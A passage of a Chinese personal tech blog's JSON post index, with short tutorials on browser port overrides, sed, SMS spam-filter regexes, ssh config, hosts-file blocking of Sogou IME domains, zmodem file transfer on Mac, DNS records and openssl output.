服务器的时候如果你希望使用一些非正常浏览的端口（正常的端口如80，8080，8081，81，443），会出现如下错误 火狐则会给出提示 此网址使用了一个通常用于网络浏览以外目的的端口。出于安全原因，Firefox 取消了该请求。","text":"在搭建 web 服务器的时候如果你希望使用一些非正常浏览的端口（正常的端口如80，8080，8081，81，443），会出现如下错误 火狐则会给出提示 此网址使用了一个通常用于网络浏览以外目的的端口。出于安全原因，Firefox 取消了该请求。 解决办法1.首先，当然是不建议使用这些非安全端口了。如果必须使用。 Chrome以 mac 系统为例，在 Chrome 启动的时候加上 –explicitly-allowed-ports=xx，xx 是你的端口 /Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --explicitly-allowed-ports=77 如果是 Windows，则找到 Chrome 图标，右键打开快捷键，在目标栏中 exe” 后面加上 –explicitly-allowed-ports=xx 即可访问 火狐1.打开火狐浏览器，在地址烂输入“about:config”2.然后在“首选项名称”的下方单击右键，选择“新建”》“字符串”3.在弹出框输入“network.security.ports.banned.override”，单击“确定” 4.然后再在弹出的“输入字符串的值”对话框中输入部署网站设置的端口","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://awen.me/tags/chrome/"}]},{"title":"批量修改目录内所有文件内容","slug":"批量修改目录内所有文件内容","date":"2017-11-16T14:00:53.000Z","updated":"2021-02-26T06:05:29.339Z","comments":true,"path":"posts/29904.html","link":"","permalink":"https://awen.me/posts/29904.html","excerpt":"","text":"有时候，我们希望把有些文件的特定内容替换成其他的，假如一个一个替换效率太低了，这个时候，我们可以借助强大的grep和sed 完成。 比如我有一些文件，我希望把其中的file.awen.me 这个url 替换成file.fangwenjun.com，首先，我们需要查找当前目录中包含这个域名的文件: 1egrep -rn &#39;file\\.awen\\.me&#39; *.md 如图所示 linux 修改然后使用sed 替换 1sed -i &quot;s@file\\.awen\\.me@file\\.fangwenjun\\.com@g&quot; &#96;grep file\\.awen\\.me -rl .&#x2F;&#96; 最后我们验证下 12ubuntu@ubuntu-xenial:&#x2F;vagrant&#x2F;_posts$ sed -i &quot;s@file\\.awen\\.me@file\\.fangwenjun\\.com@g&quot; &#96;grep file\\.awen\\.me -rl .&#x2F;&#96;ubuntu@ubuntu-xenial:&#x2F;vagrant&#x2F;_posts$ egrep -rn &#39;file\\.awen\\.me&#39; *.md 发现使用file.awen.me 已经查找不到了，而使用file.fangwenjun.com 可以查到。 1234567ubuntu@ubuntu-xenial:&#x2F;vagrant&#x2F;_posts$ egrep -rn &#39;file\\.fangwenjun\\.com&#39; *.mdAnsible使用.md:178:![](https:&#x2F;&#x2F;file.fangwenjun.com&#x2F;blog&#x2F;2017-07-02-084417.jpg!awen)Ansible使用.md:184:![](https:&#x2F;&#x2F;file.fangwenjun.com&#x2F;blog&#x2F;2017-07-02-084443.jpg!awen)Ansible使用.md:188:![](https:&#x2F;&#x2F;file.fangwenjun.com&#x2F;blog&#x2F;2017-07-02-084502.jpg!awen)ansible-学习笔记.md:215:![](https:&#x2F;&#x2F;file.fangwenjun.com&#x2F;blog&#x2F;2017-07-05-021104.jpg!awen)ansible-学习笔记.md:366:![](https:&#x2F;&#x2F;file.fangwenjun.com&#x2F;blog&#x2F;2017-07-05-024050.jpg!awen)Apache-服务.md:27:![](https:&#x2F;&#x2F;file.fangwenjun.com&#x2F;2017-06-14-073228.jpg!awen) mac 系统mac 下 sed 替换 需要指定一个备份文件才可以。 1sed -i &quot;_bak&quot; &quot;s@tags: 心情@tags: 随笔@g&quot; &#96;grep &#39;tags: 心情&#39; -rl .&#x2F;&#96;","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"如何屏蔽垃圾短信","slug":"如何屏蔽垃圾短信","date":"2017-11-16T12:31:18.000Z","updated":"2021-02-26T06:05:29.326Z","comments":true,"path":"posts/42176.html","link":"","permalink":"https://awen.me/posts/42176.html","excerpt":"相信不少人在双十一的时候都收到各种各样的垃圾营销短信，怎么屏蔽呢？","text":"相信不少人在双十一的时候都收到各种各样的垃圾营销短信，怎么屏蔽呢？ 如果你用的是iphone手机，将系统升级到iOS11,即可支持短信过滤。 首先打开 app store，搜索短信过滤，这里推荐 sifter 1块钱即可，当然也有免费的，比如腾讯手机管家。 安装完，可以把规则导入 然后在系统设置–信息，找到信息过过滤，开启即可 另外推荐各位购物、注册网站使用小号，比如阿里小号,此外购物收件人填写昵称，避免真实信息泄露。 附规则 将以下内容保存为dbgeek.sifter [Whitelist Users] [Blacklist Users] [Whitelists] [Blacklists] [Regex Whitelist Users] (\\+86\\s)?((13[0-9])|(14[5-9])|(15([0-3]|[5-9]))|16([6])|17([0-9])|(18[0-9])|19([8-9]))(\\d{8}|\\s\\d{4}\\s\\d{4}|-\\d{4}-\\d{4}) //新号段支持并排除 [Regex Blacklist Users] [Regex Whitelists] .*((code|pin).*|(验证|校验|确认|随机|代)码.+\\d{3,6}).*|(.+\\d{3,6}.+(验证|校验|确认|随机|代)码).* .*(阿里|青|腾讯|又拍|七牛|华为|移动|金山|乐视|京东)云.*(开通|停|到期).* .*(消费|交易|额度|余额|支付|收入|逾期|(还|退|扣|付|收)款).*(?&lt;!(签约|红包|满|享))(农[业金]|(交通|招商|光大|民生|浦发|人民|工商|农业|建设)银行|蚂蚁微贷).* .*(农[业金]|(交通|招商|光大|民生|浦发|人民|工商|建设)银行|蚂蚁微贷)(?!.*(签约|红包|满|享)).*(消费|交易|额度|余额|支付|收入|(还|退|扣|付|收)款).* .+(中国(移动|联通|电信))|(流量).+ .+(账号|密码).+ .*(工单|订单|客服)(?!.*[1-9][0-9]{4,10}.*) [Regex Blacklists] .*(尊敬的会员|交通|招商|光大|民生|浦发|人民|工商|农业|建设)银行.*(?&lt;=(赠|微信|报名|参与|签约|满足)).* //银行活动过滤1 .*(?&lt;=(赠|微信|报名|参与|签约|满足)).*(交通|招商|光大|民生|浦发|人民|工商|农业|建设)银行.* //银行活动过滤2 .*(交通|招商|光大|民生|浦发|人民|工商|农业|建设)银行.* //银行全局 .*(阿里|青|腾讯|又拍|七牛|华为|移动|金山|乐视|京东)云.* //云过滤 .*(订购.+流量|影视|热剧|新闻|综艺).*(移动|联通|电信)?.* //订购过滤 .*(贷款|分期|信用|活动|提现|周转|资金|现金红包|最高|最低|现金贷).* //贷款过滤 .*(京东|天猫|淘宝|苏宁|网易|严选|考拉|错过|最后|疯抢|盛宴|倒计时|好货|生活|神价|立即抢购|购物车|超级|囤货|包税|折扣|双十一|双11|钜惠).* //双11营销过滤 .*(欢迎|下次).*//景区短信 .*(开盘|开业|酬宾|楼).* //房地产 .*(促销|优惠|大礼|开业|限量|满减).* //活动过滤 .*(钱庄|办证|套牌|公关|黑车).* //垃圾过滤 .*QQ(?:.*[1-9][0-9]{4,10}).* //QQ过滤 .*(工单|订单|客服).* //垃圾过滤 .*(([彩发]票)|([百千]万)).* //垃圾过滤 .+恭喜.+回(复|短).+ //垃圾过滤 .*公益短信.* //公益短信 .*不(一定)?再有.* .*退(td|订).* //退订过滤 //以下为各种过滤 .*(ISO|MBA|VIP|按摩|暗杀|遨游|包过|答案|四六级|办理|办证|保险|保真|保值|报名|本+田|本公司|本市|必备|避税).* .*(别+墅|别墅|滨江|拨打|不论|不限|财富|财经|财务|彩铃|参会|参加|超大|超低|车程|车型|呈现|诚招|冲刺|抽奖|抽取).* .*(酬宾|出国|出炉|垂询|磁条坏|从速|促 销|促销|存到|错过|答谢|打到|打扰|打造|大汉|大奖|大礼|大赛|大宅|代+办).* .*(代+开|代办|代开|代理|带你|贷+款|贷款|担保|单位|当天|登场|登陆|等你拿|等你抢|低价|低至|抵押|地产|地铁|点播).* .*(点歌|电话卡|电脑|店内|顶级|订车|订购|订票|订座|独栋|独家|独享|渡假|短信|多重优惠|二居|二手|发 票|发+票|发行).* .*(发票|发售|法院|返本|房产|放贷|放款|放心|飞信|丰+田|风险|服务|辅导|付款|复仇|高档车|高端|高尔夫|高考|高利贷).* *.(歌剧院|更有|工程|工商|公关|公司|公益|公寓|公职|恭候|恭迎|共赴|购房|股票|股市|关注|光临|光荣|广告|贵宾专线|贵公司).* *.(海关|海景|航空|豪华|豪礼|豪宅|好消息|好友|户型|花园|华图|欢迎|换购|换季|回报|回复|回馈|回信|汇到|汇好|汇款|汇完).* .*(会馆|会所|会员|火爆|火热|获赠|机打|机会|机票|积分|基金|激情|加盟|加推|家+教|家教|家私|减肥|见谅|见证|讲授|讲座).* .*(奖学金|教师|教育|街铺|解读|借贷|借款|借钱|金融界|劲 爆|劲爆|经理|经销|惊 喜|惊喜|精品|精制|精装|酒吧|酒店|旧车|举办|举行).* .*(巨献|捐款|绝无仅有|均价|开+盘|开班|开发|开放|开讲|开课|开盘|开学|开业|看房|看楼|康佳|考察|可查|客户|客人|课程|快借|拉升).* .*(离婚|礼包|礼品|理财|莅临|连连|联系|联展|两房|谅解|靓景|临江|铃木|铃声|领取|另售|留学|留意|隆重|楼+盘|楼盘|绿地|美女|美式).* .*(免费|免试|民航|名酒|名牌|名师|名校|明星|那钱|你想|农行|派对|培+训|培训|品鉴|品牌|平价|平米|评为|凭本|凭此|期待|汽车).* .*(签约|钱还|枪+支|枪支|抢购|窃听|亲临|请汇|请与|全城|全程|全面|全线|让利|让你|热卖|热线|热销|认筹|认购|任您|日产|日起).* .*(入读|入学|赛事|三房|三居|闪亮|商场|商户|商机|商铺|商务|商业|上盖|上课|上门|社区|申购|申请|升级|升值|生态|盛 大|盛大(.* .*(盛装|师资|实惠|实力|示范单位|事故|试驾|试听|试业|收益|手机|首付|首届|售票|暑期|双赢|双重|水货|税点|税收|私家|私人|松体).* .*(送货|送礼|送票|随机|讨债|套牌|特供|特惠|特价|特邀|提供|体验|天 线|天线|贴息|同济数学|投资).* .*(团购|推出|推广|推荐|推油|托管|万科|往返|旺铺|为你|为您|维修|卫星|温馨|稳定|我 司|我公司|我司).* .*(无限|无需|物料|系列|先生|鲜花|现房|现楼|现正|现正推出|限量|香 烟|香烟|详 询|详电|详见|详情|详询).* .*(享受|项目|消 息|小 姐|小姐|小区|小学|携手|写字楼|新股|新款|新品|新鲜|信+安+易|信托|信息|信用|休闲).* .*(宣传|选择|学位|压轴|押贷|研修|演绎|洋房|养生|样板|邀你|要帐|要账|业主|一对一|一居|一线|移 民|移+民|移民|因机会|银行|英语|营销|拥有).* .*(优 惠|优惠|有机会|有奖|有效|余少量|预订|预定|预售|预约|欲购|元/平|元起|增+值|增值|赠送|长期|长期为|涨停|招生|招租|折扣).* .*(这里是|侦查|侦探|真诚|震撼|整形|正宗|证件|之际|之旅|直达|直销|至尊|志愿|致电|置业|中奖|中心|中学|周末|周年|主讲|助你|助您|注册).* .*(专场|专家|专利|专卖店|专享|专注|转发|装饰|装修|咨询|资深|自驾|总价|租售|最低价|最后|最佳|最新|尊敬|坐享|座拥|航空).* .*(豪礼|豪宅|开发商|工程|至尊|财经|景观|华美|王座|亲民|0起|收购|元/条|生病|0元起|高效|效率|快速|非诚|非誠|勿扰|勿擾|稅|禾兑|税务|培訓|亻介正宗|会计|事务所清仓).* .*(CBD|核心|百平|住宅|君地实战|操盘|试用|恒久|0平|二卫|轻轨|双语|美国|加拿大|澳洲|欧洲|免|费|幸运|保健|推拿|高价|有资金|全场).* .*(立减|面积|WAP推送|沿街|制作费|1元/条|挑高|万元|0平|建网站|关键词|首页|中轴|湖畔|仅剩|有礼|盛邀|参与|早教|买再送|还在等什么|折起|秒杀|北京大学|权威|创业).* .*(周年庆|狂欢|速抢|移居|拿卡|绝佳|底价|百万方|双湖|活动中心|跆拳道|英-语|备战|预-约|学生妹|麦包|E店|送达|看盘|券商层高|开间).* .*(沿线|行业|dai开|代kai|项目|合作|进驻|抢铺|之际|之旅|直降|資金|項目|費用|致電|國际|投資|經理|資料|豪华).* 注:本文使用双拼完成。确实很好用，不过也需要时间才能熟练起来。","categories":[],"tags":[{"name":"日常","slug":"日常","permalink":"https://awen.me/tags/%E6%97%A5%E5%B8%B8/"}]},{"title":"双拼输入法入门","slug":"双拼输入法入门","date":"2017-11-14T06:08:14.000Z","updated":"2021-02-26T06:05:29.321Z","comments":true,"path":"posts/56826.html","link":"","permalink":"https://awen.me/posts/56826.html","excerpt":"传统的大家所熟悉的拼音输入法是以文字的全拼方式来实现的，比如: 我是中国人 == wo shi zhong guo ren","text":"传统的大家所熟悉的拼音输入法是以文字的全拼方式来实现的，比如: 我是中国人 == wo shi zhong guo ren 可以看出来全拼输入法要按键盘很多次，而双拼则是这样的: 我是中国人 == wo ui vs go rf可以看出来双拼每个字只需要输入2个字母即可，效率大大提升了很多。 mac 自带的就有双拼 我还在练习中。。。。 注:本文使用双拼完成。","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"https://awen.me/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"python 读取配置文件","slug":"python-读取配置文件","date":"2017-11-14T01:45:38.000Z","updated":"2021-02-26T06:05:29.286Z","comments":true,"path":"posts/40576.html","link":"","permalink":"https://awen.me/posts/40576.html","excerpt":"","text":"在一些时候，我们不希望把一些变量写死在程序中，比如用户名密码或一些可以随时改变的参数。这个时候，我可以定义一个配置文件，将信息写入到配置文件中，让python去读取这个配置文件到信息。 通过python的 configparser 模块可以很轻松的读取配置文件内容： 配置文件信息 文件 info.ini [info] user = &apos;awen&apos; password = &apos;123456&apos; 代码#!/usr/bin/python3 #-*-coding:utf-8-*- from configparser import ConfigParser cfg = ConfigParser() cfg.read(&apos;info.ini&apos;) # 读取文件 print(cfg.sections()) # user = cfg.get(&apos;info&apos;,&apos;user&apos;) # 读取info段的user信息","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"聊一聊双十一","slug":"聊一聊双十一","date":"2017-11-11T11:27:08.000Z","updated":"2021-02-26T06:05:29.353Z","comments":true,"path":"posts/62458.html","link":"","permalink":"https://awen.me/posts/62458.html","excerpt":"双十一又到了，你的钱包空了吗？这个被人为造就出来的节日过去一直以低价促销深入人心，刺激人们去剁手，但是从我的观察来看，双十一的东西其实一点也不便宜。 价格比之前还贵有些商品比双十一之前还贵，比如我10月29号买的一件衣服是129","text":"双十一又到了，你的钱包空了吗？这个被人为造就出来的节日过去一直以低价促销深入人心，刺激人们去剁手，但是从我的观察来看，双十一的东西其实一点也不便宜。 价格比之前还贵有些商品比双十一之前还贵，比如我10月29号买的一件衣服是129 而双十一当天，他的价格非但不比之前便宜，反而还贵了10块钱 此外通过历史价格数据可以看出来，在双十一之前比当前的139 便宜一半 所以啊！买的没有卖的精。理性消费，不要贪才是最省钱的。 各种红包、优惠券完全没有用这些玩意纯属忽悠人，侮辱智商的。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"关于 CNAME 和 MX  冲突的问题解决","slug":"关于-CNAME-和-MX-冲突的问题解决","date":"2017-11-10T08:04:12.000Z","updated":"2021-02-26T06:05:29.313Z","comments":true,"path":"posts/15062.html","link":"","permalink":"https://awen.me/posts/15062.html","excerpt":"自己弄了个博客，然后还申请了个域名邮箱，但是使用裸域的时候 CNAME 和 MX 有冲突","text":"自己弄了个博客，然后还申请了个域名邮箱，但是使用裸域的时候 CNAME 和 MX 有冲突 ➜ ~ dig awen.me ; &lt;&lt;&gt;&gt; DiG 9.9.7-P3 &lt;&lt;&gt;&gt; awen.me ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 40667 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;awen.me. IN A ;; ANSWER SECTION: awen.me. 575 IN CNAME awenme.b0.aicdn.com. awenme.b0.aicdn.com. 248 IN CNAME nm.ctn.aicdn.com. nm.ctn.aicdn.com. 166 IN A 183.158.35.59 ;; Query time: 56 msec ;; SERVER: 192.168.130.33#53(192.168.130.33) ;; WHEN: Fri Nov 10 16:03:12 CST 2017 ;; MSG SIZE rcvd: 106 ➜ ~ dig awen.me MX ; &lt;&lt;&gt;&gt; DiG 9.9.7-P3 &lt;&lt;&gt;&gt; awen.me MX ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 39112 ;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;awen.me. IN MX ;; ANSWER SECTION: awen.me. 364 IN CNAME awenme.b0.aicdn.com. awenme.b0.aicdn.com. 37 IN CNAME nm.ctn.aicdn.com. ;; AUTHORITY SECTION: aicdn.com. 80 IN SOA ns1.ialloc.com. wtzhu182.163.com. 2015102101 3600 180 1209600 10800 ;; Query time: 60 msec ;; SERVER: 192.168.130.33#53(192.168.130.33) ;; WHEN: Fri Nov 10 16:06:43 CST 2017 ;; MSG SIZE rcvd: 150正常的邮件设置应该是这样 ➜ ~ dig awen.me MX @114.114.114.114 ; &lt;&lt;&gt;&gt; DiG 9.9.7-P3 &lt;&lt;&gt;&gt; awen.me MX @114.114.114.114 ;; global options: +cmd ;; Got answer: ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 3250 ;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;awen.me. IN MX ;; ANSWER SECTION: awen.me. 600 IN MX 10 mxbiz2.qq.com. awen.me. 600 IN MX 5 mxbiz1.qq.com. ;; Query time: 1086 msec ;; SERVER: 114.114.114.114#53(114.114.114.114) ;; WHEN: Fri Nov 10 16:07:30 CST 2017 ;; MSG SIZE rcvd: 77 解决办法1.不要用裸域去做cname 解析，比如 awen.me 如果希望用 MX ，这个域名就不适合做 CNAME 解析2.如果一定要用裸域，那也只能用 A 记录代替了。比如你用 CDN， 你可以拿到 CDN 的 IP 地址去做A记录解析，博主目前就是这么干的，缺点就是你需要针对不同运营商单独做A记录解析，而且 CDN 厂商可能会变更 IP 地址，要针对性的定期做替换。","categories":[],"tags":[{"name":"域名解析","slug":"域名解析","permalink":"https://awen.me/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"}]},{"title":"ssh-config 管理","slug":"ssh-config-管理","date":"2017-11-09T07:56:38.000Z","updated":"2021-02-26T06:05:29.291Z","comments":true,"path":"posts/47848.html","link":"","permalink":"https://awen.me/posts/47848.html","excerpt":"有时候，我们要管理很多台服务器，一个一个去连接，例如： ssh username@ip -p port这样非常痛苦的，因为IP地址不容易记忆。那怎么办？用ssh的config 来进行管理即可，具体如下:","text":"有时候，我们要管理很多台服务器，一个一个去连接，例如： ssh username@ip -p port这样非常痛苦的，因为IP地址不容易记忆。那怎么办？用ssh的config 来进行管理即可，具体如下: vim ~/.ssh/config 在当前用户的.ssh目录下创建一个 config 文件，格式如下: Host name HostName ip Port port User username IdentityFile path/to/id_rsa例如： ➜ .ssh cat ~/.ssh/config Host ssh1 HostName 10.173.32.108 Port 22 User root IdentityFile /Users/wenjun/.ssh/ssh1然后只需要执行 ssh ssh1即可连接 ➜ ssh ssh1 The authenticity of host &apos;10.173.32.108 (10.173.32.108)&apos; can&apos;t be established. ECDSA key fingerprint is SHA256:KtMXK9uQgIAwzOkvvqncijKggykVjiRTuYnNH5gFslY. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &apos;10.173.32.108&apos; (ECDSA) to the list of known hosts. [root@test ~]# [root@test ~]# [root@test ~]# exit 登出 Connection to 10.173.32.108 closed.","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"关于 mac 版搜狗输入法的一些安全设置","slug":"关于-mac-版搜狗输入法的一些安全设置","date":"2017-11-08T06:36:44.000Z","updated":"2021-02-26T06:05:29.314Z","comments":true,"path":"posts/57385.html","link":"","permalink":"https://awen.me/posts/57385.html","excerpt":"搜狗输入法确实很方便，但是我发现他有一个令人不安的地方，那就是他的数据传输完全是http 明文传输的。 我们检查其程序发现包含很多个二级域名，都是以 http 协议在运行。","text":"搜狗输入法确实很方便，但是我发现他有一个令人不安的地方，那就是他的数据传输完全是http 明文传输的。 我们检查其程序发现包含很多个二级域名，都是以 http 协议在运行。 ➜ dist strings /Library/Input\\ Methods/SogouInput.app/Contents/SogouServices | grep sogou.com http://macime.sogou.com/macassodict.php? http://pinyin.sogou.com/dict/nickname.php http://profile.pinyin.sogou.com/download.php http://mac.profile.pinyin.sogou.com/get_key.php http://mac.profile.pinyin.sogou.com/get_dict.php http://mac.profile.pinyin.sogou.com/upload.php http://ping.pinyin.sogou.com/sync.gif?h=%@&amp;r=%@&amp;v=%@&amp;os=%@&amp;err=%ld&amp;from=mac&amp;uname=%@&amp;uid=%@&amp;pt=%@&amp;s=%d http://ping.pinyin.sogou.com/sync.gif?h=%@&amp;r=%@&amp;v=%@&amp;os=%@&amp;err=%ld&amp;from=mac&amp;uname=%@&amp;uid=%@&amp;pt=%lu&amp;s=%d http://pinyin.sogou.com/api/rec/file.php?file=setlog&amp;h=%@&amp;v=%@ /act/authtoken?appid=%ld&amp;userid=%@&amp;token=%@&amp;livetime=%ld&amp;authtype=3&amp;ru=http://profile.pinyin.sogou.com/ /act/authtoken?appid=%ld&amp;userid=%@&amp;token=%@&amp;livetime=%ld&amp;authtype=3&amp;ts=%@&amp;ru=http://profile.pinyin.sogou.com/ https://account.sogou.com http://ping.pinyin.sogou.com/crash.gif?h=%@&amp;r=%@&amp;v=%@&amp;os=%@&amp;app=%@&amp;ime=%@&amp;src=mac cloud.pinyin.sogou.com http://cloud.pinyin.sogou.com http://get.sogou.com/q http://macime.sogou.com/macinstall.gif?h=%@&amp;r=%@&amp;v=%@&amp;in=1&amp;inst=%@ http://macime.sogou.com/sgupdate.php? http://config.pinyin.sogou.com/macpicface/interface/get_hotlist.php? http://macime.sogou.com/macversion.txt? http://account.sogou.com/act/refreshtoken http://account.sogou.com http://config.pinyin.sogou.com/dict/upt_cell_dict6.5.php http://ime.sogou.com/pyup.gif?于是，我将其提取出来，扔到了 /etc/hosts 127.0.0.1 account.sogou.com 127.0.0.1 cloud.pinyin.sogou.com 127.0.0.1 config.pinyin.sogou.com 127.0.0.1 get.sogou.com 127.0.0.1 ime.sogou.com 127.0.0.1 mac.profile.pinyin.sogou.com 127.0.0.1 macime.sogou.com 127.0.0.1 ping.pinyin.sogou.com 127.0.0.1 pinyin.sogou.com 127.0.0.1 profile.pinyin.sogou.com","categories":[],"tags":[{"name":"mac 小技巧","slug":"mac-小技巧","permalink":"https://awen.me/tags/mac-%E5%B0%8F%E6%8A%80%E5%B7%A7/"}]},{"title":"Mac 使用 sz 和 rz","slug":"Mac-使用-sz-和-rz","date":"2017-11-07T02:45:42.000Z","updated":"2021-02-26T06:05:29.259Z","comments":true,"path":"posts/51303.html","link":"","permalink":"https://awen.me/posts/51303.html","excerpt":"前言在以前使用 Windows 的时候，通过 SecureCRT 连接 Linux，经常使用 sz 命令把服务器的文件下载到 Windows 机器。非常方便，不用使用例如 Winscp 、Filezilla 之类的工具通过 scp 远程到服务器下载，可以说节省了很多时间。","text":"前言在以前使用 Windows 的时候，通过 SecureCRT 连接 Linux，经常使用 sz 命令把服务器的文件下载到 Windows 机器。非常方便，不用使用例如 Winscp 、Filezilla 之类的工具通过 scp 远程到服务器下载，可以说节省了很多时间。 而在使用 mac 之后，发现系统默认是不带这个工具的。后来 Google 发现还是有解决办法的。这里做个简单的整理。 Linux 安装 sz和rzcentos 1sudo yum install lrzsz ubuntu: 1sudo apt-get lrzsz mac 安装12345brew install lrzszcd &#x2F;usr&#x2F;local&#x2F;binsudo wget https:&#x2F;&#x2F;raw.github.com&#x2F;mmastrac&#x2F;iterm2-zmodem&#x2F;master&#x2F;iterm2-send-zmodem.shsudo wget https:&#x2F;&#x2F;raw.github.com&#x2F;mmastrac&#x2F;iterm2-zmodem&#x2F;master&#x2F;iterm2-recv-zmodem.shsudo chmod 777 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;iterm2-* 打开Item2，点击preferences → profiles，选择某个profile，如Default，之后继续选择advanced → triggers，添加编辑添加如下triggers： Regular Expression Action Parameters rz waiting to receive.**B0100 Run Silent Coprocess /usr/local/bin/iterm2-send-zmodem.sh **B00000000000000 Run Silent Coprocess /usr/local/bin/iterm2-recv-zmodem.sh 如图所示 然后远程到服务器试试上传文件 123456➜ ~ rzrz waiting to receive.**B0100000023be50➜ ~ # Received &#x2F;Users&#x2F;wenjun&#x2F;Downloads&#x2F;iTerm2-3_1_4.zip➜ ~ lsiTerm2-3_1_4.zip➜ ~ 从远程服务器下载文件到本地 12345➜ ~ sz iTerm2-3_1_4.zip**B00000000000000➜ ~➜ ~ # Sent -&gt; &#x2F;Users&#x2F;wenjun&#x2F;Downloads&#x2F;➜ ~ 啊！简直太方便了是不是。。","categories":[],"tags":[{"name":"mac 小技巧","slug":"mac-小技巧","permalink":"https://awen.me/tags/mac-%E5%B0%8F%E6%8A%80%E5%B7%A7/"}]},{"title":"mac 自动关闭应用程序","slug":"mac-自动关闭应用程序","date":"2017-11-04T00:57:39.000Z","updated":"2021-02-26T06:05:29.277Z","comments":true,"path":"posts/29021.html","link":"","permalink":"https://awen.me/posts/29021.html","excerpt":"最近不知道怎么地，mac 总是隔着10分钟左右就自动退出了所有的应用程序，我检查了屏幕保护程序和节能设置都无效。最后发现原来在安全与隐私里把","text":"最近不知道怎么地，mac 总是隔着10分钟左右就自动退出了所有的应用程序，我检查了屏幕保护程序和节能设置都无效。最后发现原来在安全与隐私里把 在多少分钟不活跃后退出登录","categories":[],"tags":[{"name":"mac小技巧","slug":"mac小技巧","permalink":"https://awen.me/tags/mac%E5%B0%8F%E6%8A%80%E5%B7%A7/"}]},{"title":"openssl相关命令","slug":"openssl相关命令","date":"2017-11-03T07:05:42.000Z","updated":"2021-02-26T06:05:29.281Z","comments":true,"path":"posts/10748.html","link":"","permalink":"https://awen.me/posts/10748.html","excerpt":"s_clientopenssl s_client -connect awen.me:443 -state 显示证书信息","text":"s_clientopenssl s_client -connect awen.me:443 -state 显示证书信息 ➜ Downloads openssl s_client -connect awen.me:443 -state CONNECTED(00000003) SSL_connect:before/connect initialization SSL_connect:SSLv2/v3 write client hello A SSL_connect:SSLv3 read server hello A depth=2 O = Digital Signature Trust Co., CN = DST Root CA X3 verify return:1 depth=1 C = US, O = Let&apos;s Encrypt, CN = Let&apos;s Encrypt Authority X3 verify return:1 depth=0 CN = awen.me verify return:1 SSL_connect:SSLv3 read server certificate A SSL_connect:SSLv3 read server key exchange A SSL_connect:SSLv3 read server done A SSL_connect:SSLv3 write client key exchange A SSL_connect:SSLv3 write change cipher spec A SSL_connect:SSLv3 write finished A SSL_connect:SSLv3 flush data SSL_connect:SSLv3 read server session ticket A SSL_connect:SSLv3 read finished A --- Certificate chain 0 s:/CN=awen.me i:/C=US/O=Let&apos;s Encrypt/CN=Let&apos;s Encrypt Authority X3 1 s:/C=US/O=Let&apos;s Encrypt/CN=Let&apos;s Encrypt Authority X3 i:/O=Digital Signature Trust Co./CN=DST Root CA X3 --- Server certificate -----BEGIN CERTIFICATE----- MIIFDDCCA/SgAwIBAgISA3pwr8utOg9I8/XTJ+8wdJTOMA0GCSqGSIb3DQEBCwUA MEoxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MSMwIQYDVQQD ExpMZXQncyBFbmNyeXB0IEF1dGhvcml0eSBYMzAeFw0xNzEwMTEwMDAzMzhaFw0x ODAxMDkwMDAzMzhaMBIxEDAOBgNVBAMTB2F3ZW4ubWUwggEiMA0GCSqGSIb3DQEB AQUAA4IBDwAwggEKAoIBAQCtCuIWnpHvn6Lm7twgUlkzy1v6j1tQ/yDxWyd8gvOk GJhLTlAepXdkLQsEw2QRpGxoOvsO28K9MH4B1baLGyl5TbNnZAFIUOrkDBMvaPFU FYXK2yqtdSfky9AD3LkSjRcDMspqm9tIqjBYyu78lomZR/AgcVePYPwYfONzaE8J 4NvCLneFI+fzifNuqpkUt18wpWBp/oVC1/ln74ShVmYczg9IqTX8vw58MWlBemIL OI40ExXDnOHa7ZdxFl1lKPtVjfQjR3bS84Dsj7XBqDYLe3tJNed0+kTJIgQFhshH kcpDpMPW78rDz/e1akA2o0Ry/WzAnf9dOJDfjvd7FsC1AgMBAAGjggIiMIICHjAO BgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwG A1UdEwEB/wQCMAAwHQYDVR0OBBYEFO1HBP+QqfO+dhvj5nr6vAr/mlOHMB8GA1Ud IwQYMBaAFKhKamMEfd265tE5t6ZFZe/zqOyhMG8GCCsGAQUFBwEBBGMwYTAuBggr BgEFBQcwAYYiaHR0cDovL29jc3AuaW50LXgzLmxldHNlbmNyeXB0Lm9yZzAvBggr BgEFBQcwAoYjaHR0cDovL2NlcnQuaW50LXgzLmxldHNlbmNyeXB0Lm9yZy8wLQYD VR0RBCYwJIIHYXdlbi5tZYIMZmlsZS5hd2VuLm1lggt3d3cuYXdlbi5tZTCB/gYD VR0gBIH2MIHzMAgGBmeBDAECATCB5gYLKwYBBAGC3xMBAQEwgdYwJgYIKwYBBQUH AgEWGmh0dHA6Ly9jcHMubGV0c2VuY3J5cHQub3JnMIGrBggrBgEFBQcCAjCBngyB m1RoaXMgQ2VydGlmaWNhdGUgbWF5IG9ubHkgYmUgcmVsaWVkIHVwb24gYnkgUmVs 